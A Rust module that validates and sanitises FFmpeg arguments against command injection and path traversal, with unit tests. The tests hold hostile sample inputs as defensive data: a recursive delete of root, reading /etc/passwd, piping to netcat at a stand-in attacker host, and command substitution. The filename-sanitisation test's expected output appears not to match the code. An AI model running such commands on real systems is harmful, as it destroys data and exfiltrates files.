use regex::Regex;
use std::collections::HashSet;
use thiserror::Error;

#[derive(Error, Debug)]
pub enum SecurityError {
    #[error("Potential command injection detected in argument: {arg}")]
    CommandInjection { arg: String },
    #[error("Disallowed argument: {arg}")]
    DisallowedArgument { arg: String },
    #[error("Suspicious path detected: {path}")]
    SuspiciousPath { path: String },
    #[error("Too many arguments: {count} (max: {max})")]
    TooManyArguments { count: usize, max: usize },
    #[error("Invalid file path format: {path}")]
    InvalidPath { path: String },
}

#[derive(Debug)]
pub struct SecurityValidator {
    // Patterns that indicate potential command injection
    injection_patterns: Vec<Regex>,
    // Arguments that are explicitly disallowed
    disallowed_args: HashSet<String>,
    // Maximum number of arguments allowed
    max_args: usize,
}

impl SecurityValidator {
    pub fn new() -> Self {
        let mut injection_patterns = Vec::new();

        // Common command injection patterns
        injection_patterns.push(Regex::new(r"[;&|`$]").unwrap()); // Shell metacharacters
        injection_patterns.push(Regex::new(r"\$\([^)]*\)").unwrap()); // Command substitution
        injection_patterns.push(Regex::new(r"`[^`]*`").unwrap()); // Backtick command substitution
        injection_patterns.push(Regex::new(r"\.\./").unwrap()); // Directory traversal
        injection_patterns.push(Regex::new(r"\\x[0-9a-fA-F]{2}").unwrap()); // Hex encoding
        injection_patterns.push(Regex::new(r"%[0-9a-fA-F]{2}").unwrap()); // URL encoding

        let mut disallowed_args = HashSet::new();

        // Disallow potentially dangerous FFmpeg options
        disallowed_args.insert("-f".to_string()); // Format specification (can be dangerous)
        disallowed_args.insert("-filter_complex".to_string()); // Complex filters
        disallowed_args.insert("-vf".to_string()); // Video filters (can execute scripts)
        disallowed_args.insert("-af".to_string()); // Audio filters
        disallowed_args.insert("-map".to_string()); // Stream mapping (can access system)
        disallowed_args.insert("-dump".to_string()); // Dump options
        disallowed_args.insert("-debug".to_string()); // Debug options
        disallowed_args.insert("-report".to_string()); // Report generation
        disallowed_args.insert("-stdin".to_string()); // Standard input
        disallowed_args.insert("-protocol_whitelist".to_string()); // Protocol whitelist manipulation
        disallowed_args.insert("-protocol_blacklist".to_string()); // Protocol blacklist manipulation
        disallowed_args.insert("-safe".to_string()); // Safe mode manipulation

        Self {
            injection_patterns,
            disallowed_args,
            max_args: 50, // Reasonable limit for FFmpeg commands
        }
    }

    pub fn validate_ffmpeg_args(&self, args: &[String]) -> Result<Vec<String>, SecurityError> {
        // Check argument count
        if args.len() > self.max_args {
            return Err(SecurityError::TooManyArguments {
                count: args.len(),
                max: self.max_args,
            });
        }

        let mut sanitized_args = Vec::new();

        for arg in args {
            // Check for command injection patterns
            for pattern in &self.injection_patterns {
                if pattern.is_match(arg) {
                    return Err(SecurityError::CommandInjection { arg: arg.clone() });
                }
            }

            // Check for disallowed arguments
            if self.disallowed_args.contains(arg) {
                return Err(SecurityError::DisallowedArgument { arg: arg.clone() });
            }

            // Additional validation for file paths
            if arg.starts_with('/') || arg.starts_with("./") || arg.starts_with("../") {
                self.validate_path(arg)?;
            }

            sanitized_args.push(arg.clone());
        }

        Ok(sanitized_args)
    }

    pub fn validate_path(&self, path: &str) -> Result<(), SecurityError> {
        // Normalize path separators
        let normalized = path.replace('\\', "/");

        // Check for directory traversal
        if normalized.contains("../") {
            return Err(SecurityError::SuspiciousPath {
                path: path.to_string(),
            });
        }

        // Check for suspicious paths
        let suspicious_paths = [
            "/etc/",
            "/proc/",
            "/sys/",
            "/dev/",
            "/tmp/",
            "C:/Windows/",
            "C:/Program Files/",
            "/System/",
            "/bin/",
            "/sbin/",
            "/usr/bin/",
            "/usr/sbin/",
        ];

        for suspicious in &suspicious_paths {
            if normalized.starts_with(suspicious) {
                return Err(SecurityError::SuspiciousPath {
                    path: path.to_string(),
                });
            }
        }

        // Validate path format
        if normalized.is_empty() || normalized.len() > 4096 {
            return Err(SecurityError::InvalidPath {
                path: path.to_string(),
            });
        }

        Ok(())
    }

    pub fn sanitize_filename(&self, filename: &str) -> String {
        // Remove or replace dangerous characters in filenames
        let mut sanitized = filename.to_string();

        // Replace dangerous characters with safe alternatives
        sanitized = sanitized.replace('/', "_");
        sanitized = sanitized.replace('\\', "_");
        sanitized = sanitized.replace('<', "_");
        sanitized = sanitized.replace('>', "_");
        sanitized = sanitized.replace(':', "_");
        sanitized = sanitized.replace('"', "_");
        sanitized = sanitized.replace('|', "_");
        sanitized = sanitized.replace('?', "_");
        sanitized = sanitized.replace('*', "_");
        sanitized = sanitized.replace('\0', "_");

        // Remove leading/trailing whitespace and dots
        sanitized = sanitized.trim().trim_matches('.').to_string();

        // Ensure filename is not empty
        if sanitized.is_empty() {
            sanitized = "unnamed".to_string();
        }

        // Limit filename length
        if sanitized.len() > 255 {
            sanitized.truncate(252);
            sanitized.push_str("...");
        }

        sanitized
    }

    pub fn build_safe_ffmpeg_command(
        &self,
        input_path: &str,
        output_path: &str,
        video_codec: &str,
        audio_codec: &str,
        quality: &str,
        use_hardware_accel: bool,
        is_remux: bool,
    ) -> Result<Vec<String>, SecurityError> {
        let mut args = Vec::new();

        // Basic FFmpeg arguments (these are safe)
        args.push("-nostdin".to_string());
        args.push("-y".to_string()); // Overwrite output files
        args.push("-hide_banner".to_string());
        args.push("-loglevel".to_string());
        args.push("info".to_string());
        args.push("-progress".to_string());
        args.push("pipe:1".to_string());

        // Hardware acceleration (if requested)
        if use_hardware_accel {
            args.push("-hwaccel".to_string());
            args.push("auto".to_string());
        }

        // Input file
        self.validate_path(input_path)?;
        args.push("-i".to_string());
        args.push(input_path.to_string());

        // Codec settings
        if is_remux {
            args.push("-c".to_string());
            args.push("copy".to_string());
        } else {
            // Validate and add video codec
            let safe_video_codec = self.sanitize_codec(video_codec)?;
            args.push("-c:v".to_string());
            args.push(safe_video_codec);

            // Validate and add audio codec
            let safe_audio_codec = self.sanitize_codec(audio_codec)?;
            args.push("-c:a".to_string());
            args.push(safe_audio_codec);

            // Add quality settings if applicable
            if !quality.is_empty() && (video_codec.contains("264") || video_codec.contains("265")) {
                let safe_quality = self.sanitize_quality(quality)?;
                args.push("-crf".to_string());
                args.push(safe_quality);
            }
        }

        // Output file
        self.validate_path(output_path)?;
        args.push(output_path.to_string());

        // Final validation of all arguments
        self.validate_ffmpeg_args(&args)
    }

    fn sanitize_codec(&self, codec: &str) -> Result<String, SecurityError> {
        // Whitelist of allowed codecs
        let allowed_codecs = [
            "libx264",
            "libx265",
            "libvpx-vp9",
            "libaom-av1",
            "aac",
            "libmp3lame",
            "libopus",
            "flac",
            "pcm_s16le",
            "pcm_s24le",
            "copy",
        ];

        if allowed_codecs.contains(&codec) {
            Ok(codec.to_string())
        } else {
            Err(SecurityError::DisallowedArgument {
                arg: format!("codec: {}", codec),
            })
        }
    }

    fn sanitize_quality(&self, quality: &str) -> Result<String, SecurityError> {
        // Validate quality parameter (should be a number between 0-51 for CRF)
        if let Ok(crf) = quality.parse::<u32>() {
            if crf <= 51 {
                return Ok(quality.to_string());
            }
        }

        // Check for bitrate format (e.g., "1000k", "2M")
        if quality.ends_with('k') || quality.ends_with('K') {
            let number_part = &quality[..quality.len() - 1];
            if let Ok(bitrate) = number_part.parse::<u32>() {
                if bitrate <= 100000 {
                    // Max 100Mbps
                    return Ok(quality.to_string());
                }
            }
        }

        if quality.ends_with('M') || quality.ends_with('m') {
            let number_part = &quality[..quality.len() - 1];
            if let Ok(bitrate) = number_part.parse::<f32>() {
                if bitrate <= 100.0 {
                    // Max 100Mbps
                    return Ok(quality.to_string());
                }
            }
        }

        Err(SecurityError::DisallowedArgument {
            arg: format!("quality: {}", quality),
        })
    }
}

impl Clone for SecurityValidator {
    fn clone(&self) -> Self {
        Self::new() // Recreate with same patterns and settings
    }
}

impl Default for SecurityValidator {
    fn default() -> Self {
        Self::new()
    }
}

// Additional security utilities
pub struct SecurityUtils;

impl SecurityUtils {
    pub fn generate_temp_filename(base_name: &str) -> String {
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        let random_suffix: u32 = rand::random();

        format!("{}_{:x}_{:x}.tmp", base_name, timestamp, random_suffix)
    }

    pub fn is_safe_extension(extension: &str) -> bool {
        let safe_extensions = [
            "mp4", "mkv", "avi", "mov", "webm", "flv", "wmv", "m4v", "3gp", "ts", "mts", "m2ts",
        ];

        safe_extensions.contains(&extension.to_lowercase().as_str())
    }

    pub fn calculate_file_hash(data: &[u8]) -> String {
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};

        let mut hasher = DefaultHasher::new();
        data.hash(&mut hasher);
        format!("{:x}", hasher.finish())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_command_injection_detection() {
        let validator = SecurityValidator::new();

        let malicious_args = vec![
            "input.mp4; rm -rf /".to_string(),
            "input.mp4 && cat /etc/passwd".to_string(),
            "input.mp4 | nc attacker.com 1234".to_string(),
            "$(whoami)".to_string(),
            "`id`".to_string(),
        ];

        for arg in malicious_args {
            assert!(validator.validate_ffmpeg_args(&[arg]).is_err());
        }
    }

    #[test]
    fn test_path_validation() {
        let validator = SecurityValidator::new();

        // These should fail
        assert!(validator.validate_path("../../../etc/passwd").is_err());
        assert!(validator.validate_path("/etc/shadow").is_err());
        assert!(validator.validate_path("C:/Windows/System32/").is_err());

        // These should pass
        assert!(validator.validate_path("/home/user/video.mp4").is_ok());
        assert!(validator.validate_path("./videos/input.mov").is_ok());
    }

    #[test]
    fn test_filename_sanitization() {
        let validator = SecurityValidator::new();

        assert_eq!(
            validator.sanitize_filename("file<>:\"|?*.mp4"),
            "file_________.mp4"
        );
        assert_eq!(validator.sanitize_filename(""), "unnamed");
    }
}
